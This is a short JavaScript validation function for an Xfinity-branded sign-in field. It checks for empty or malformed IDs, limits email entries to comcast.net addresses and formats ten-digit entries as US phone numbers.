function validateForm() {
    var userInput = document.getElementById('user');
    var errorDiv = document.getElementById('user-error');
    var invalidChars = /[!#$%^&*,()+|\}\]{["'?/><;:'=]/; // Define invalid characters

    if (userInput.value.trim() === '') {
        userInput.style.border = '1.5px solid red';
        errorDiv.textContent = 'Please enter your Xfinity ID to sign in.';
        errorDiv.style.display = 'block';
        return false;
    } else if (invalidChars.test(userInput.value) || userInput.value.trim().length < 3) {
        userInput.style.border = '1.5px solid red';
        errorDiv.textContent = 'The Xfinity ID or password you entered was incorrect. Please try again.';
        errorDiv.style.display = 'block';
        return false;
    } else if (userInput.value.includes('@') && !userInput.value.endsWith('comcast.net')) {
        userInput.style.border = '1.5px solid red';
        errorDiv.textContent = 'The Xfinity ID or password you entered was incorrect. Please try again.';
        errorDiv.style.display = 'block';
        return false;
    } else {
        // Check for a US phone number pattern
        var digits = userInput.value.replace(/\D/g, ''); // Strip non-numeric characters
        if (digits.length === 10 && !/\D/.test(userInput.value)) {
            userInput.value = digits.replace(/(\d{3})(\d{3})(\d{4})/, '$1-$2-$3'); // Format as a US phone number
        }

        userInput.style.border = ''; // Clear any custom border styles
        errorDiv.style.display = 'none'; // Hide error message
        return true;
    }
}